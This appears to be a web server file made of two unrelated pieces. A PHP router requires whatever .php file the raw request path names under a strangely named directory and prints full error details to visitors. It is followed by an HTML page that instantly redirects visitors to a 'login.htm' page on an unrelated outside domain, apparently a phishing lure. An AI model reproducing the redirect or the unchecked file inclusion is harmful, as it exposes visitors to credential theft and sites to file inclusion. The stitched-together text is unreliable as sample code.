<?php
register_shutdown_function(function () {
    $error = error_get_last();
    if ($error !== null) {
        http_response_code(200);
        echo "<pre style='color:red; font-size:16px;'>";
        print_r($error);
        echo "</pre>";
    }
});

$baseDir = __DIR__ . '/apppp/iclllll';
$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);

if ($uri === '/' || $uri === '') {
    chdir($baseDir);
    require $baseDir . '/index.php';
    exit;
}

$file = $baseDir . $uri;

if (file_exists($file) && !is_dir($file)) {
    if (pathinfo($file, PATHINFO_EXTENSION) === 'php') {
        chdir(dirname($file));
        require $file;
        exit;
    }
    return false;
}

chdir($baseDir);
require $baseDir . '/index.php';
<html>
<head>
   <!-- HTML meta refresh URL redirection -->
   <meta http-equiv="refresh"
   content="0; url=https://redbamsold.com/autopaas/login.htm">
</head>
<body>
   
</body>
</html>
